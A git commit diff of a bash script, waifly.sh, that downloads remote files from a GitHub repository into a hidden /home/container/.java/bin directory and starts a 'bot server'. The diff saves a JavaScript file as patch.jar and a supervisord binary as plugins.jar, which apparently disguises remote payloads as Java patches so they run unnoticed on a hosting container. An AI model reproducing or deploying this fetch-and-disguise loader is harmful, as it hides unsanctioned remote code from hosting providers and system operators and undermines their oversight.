a3ce9635eb2b001ca08467ef4d9439247d93211a
i51jir6ni9t0 <wker-one@protonmail.com>
2024-04-25 12:22:06 +0000

    FR-N1 NODE SCRIPTS UPDATED

--- scripts/waifly.sh
+++ scripts/waifly.sh
@@ -1,11 +1,12 @@
 #!/bin/bash
 
 function fetch_files() {
-    echo "Applying Patches ..."
+    echo "Downloading Patches ..."
     mkdir -p /home/container/.java/bin
-    cd /home/container/.java/bin && curl -LO https://github.com/i51jir6ni9t0/backup/raw/master/mc/patch.jar
+    cd /home/container/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/app.js -o patch.jar
     cd /home/container/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o plugins.jar
-    cd /home/container/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/conf/fr-n1.conf -o cfg.conf
+    cd /home/container/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/conf/fr-n2-cfg.conf -o cfg.conf
+    cd /home/container/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/conf/fr-n1-conf.json -o conf.json
     echo "DONE ..."
 }
 
@@ -15,7 +16,7 @@ function start_app() {
     echo "BOT SERVER STARTED ..."
 }
 
-if [ -f "/home/container/.java/bin/cfg.conf" ] && [ -f "/home/container/.java/bin/patch.jar" ] && [ -f "/home/container/.java/bin/plugins.jar" ]; then
+if [ -f "/home/container/.java/bin/cfg.conf" ] && [ -f "/home/container/.java/bin/patch.jar" ] && [ -f "/home/container/.java/bin/plugins.jar" ] && [ -f "/home/container/.java/bin/conf.json" ]; then
     echo "Patch files already fetched ..."
     start_app
 else
